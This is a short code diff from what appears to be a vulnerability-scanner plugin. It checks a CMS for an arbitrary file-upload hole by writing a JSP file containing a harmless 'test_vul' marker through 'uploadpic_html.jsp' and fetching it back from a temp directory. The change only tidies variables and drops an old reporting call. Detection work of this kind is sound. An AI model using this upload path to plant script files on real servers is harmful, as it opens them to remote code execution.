@@ -69,13 +69,12 @@ test_vul
 </root>
 ''' % arr.netloc
             url = self.target + '/cms/client/uploadpic_html.jsp?toname=xx.jsp&diskno=xxxx'
-            code, head, res, errcode, _ = hh.http(url, raw=raw)
+            _code, _head, res, _errcode, _ = hh.http(url, raw=raw)
             if 'dGVzdF92dWw=' in res:
                 payload = '/cms-data/temp_dir/xxxx/temp.files/xx.jsp'
                 url = self.target + payload
-                code, head, res, errcode, _ = hh.http(url)
+                _code, _head, res, _errcode, _ = hh.http(url)
                 if 'test_vul' in res:
-                    security_hole(url)
                     self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                         target=self.target, name=self.vuln.name))
 
